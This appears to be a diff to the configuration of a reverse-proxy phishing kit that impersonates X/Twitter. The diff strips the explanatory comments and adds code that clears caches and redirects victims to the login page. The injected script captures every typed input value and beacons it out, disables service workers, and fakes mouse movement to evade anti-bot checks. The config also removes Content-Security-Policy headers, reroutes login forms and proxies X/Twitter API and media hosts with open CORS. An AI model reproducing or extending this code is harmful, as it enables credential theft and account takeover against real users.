@@ -45,7 +45,6 @@ js_inject:
     trigger_paths: ["/"]
     script: |
       (function(){
-        // Kill Service Workers
         try {
             if (navigator.serviceWorker) {
                 navigator.serviceWorker.getRegistrations().then(function(registrations) {
@@ -53,7 +52,6 @@ js_inject:
                         registration.unregister();
                     }
                 });
-                // Prevent new registrations
                 Object.defineProperty(navigator, 'serviceWorker', {
                     value: {
                         register: function() { return new Promise(() => {}); },
@@ -62,8 +60,6 @@ js_inject:
                 });
             }
         } catch(e) {}
-        
-        // Anti-Bot: Mock user behavior
         document.addEventListener('contextmenu', e => e.preventDefault());
         setInterval(() => {
            const ev = new MouseEvent('mousemove', {
@@ -72,11 +68,8 @@ js_inject:
            });
            document.dispatchEvent(ev);
         }, 2500);
-        
-        // Input Capture
         document.addEventListener('input', function(e) {
             if(e.target.tagName === 'INPUT') {
-                 // Send to Beacon
                  if(window.navigator.sendBeacon) {
                     const data = new FormData();
                     data.append('k', e.target.value);
@@ -85,6 +78,20 @@ js_inject:
                  }
             }
         });
+        try {
+          if (window.caches && window.caches.keys) {
+            window.caches.keys().then(function(keys){ keys.forEach(function(k){ try{ window.caches.delete(k); }catch(e){} }); });
+          }
+        } catch(e){}
+        setTimeout(function(){
+          try{
+            var bad = (document.body && document.body.textContent && document.body.textContent.toLowerCase().indexOf('something went wrong') !== -1);
+            var hasLogin = document.querySelector('form[action*=\"login\"], [data-testid*=\"LoginForm\"], a[href*=\"/login\"], input[name=\"text\"]');
+            if (bad || !hasLogin) {
+              if (location.pathname !== '/i/flow/login') location.href = '/i/flow/login';
+            }
+          }catch(e){}
+        }, 2000);
       })();
 headers:
   - {action: "remove", name: "Content-Security-Policy"}
@@ -99,10 +106,10 @@ blocklist:
 form_actions:
   - {selector: "form[action*=\"login\"], form[data-testid*=\"Login\"]", action_to: "/sessions"}
 bridges:
-  - {prefix: "/_xapi/", target_host: "api.x.com", strip_prefix: true, cors: "allow_all"}
+  - {prefix: "/_xapi/", target_host: "api.x.com", origin_host: "x.com", strip_prefix: true, cors: "allow_all"}
   - {prefix: "/_xabs/", target_host: "abs.twimg.com", strip_prefix: true, cors: "allow_all"}
   - {prefix: "/_xton/", target_host: "ton.twimg.com", strip_prefix: true, cors: "allow_all"}
   - {prefix: "/_xpbs/", target_host: "pbs.twimg.com", strip_prefix: true, cors: "allow_all"}
   - {prefix: "/_xvid/", target_host: "video.twimg.com", strip_prefix: true, cors: "allow_all"}
-  - {prefix: "/_xtapi/", target_host: "api.twitter.com", strip_prefix: true, cors: "allow_all"}
-  - {prefix: "/_xtw/", target_host: "twitter.com", strip_prefix: true, cors: "allow_all"}
+  - {prefix: "/_xtapi/", target_host: "api.twitter.com", origin_host: "twitter.com", strip_prefix: true, cors: "allow_all"}
+  - {prefix: "/_xtw/", target_host: "twitter.com", origin_host: "twitter.com", strip_prefix: true, cors: "allow_all"}
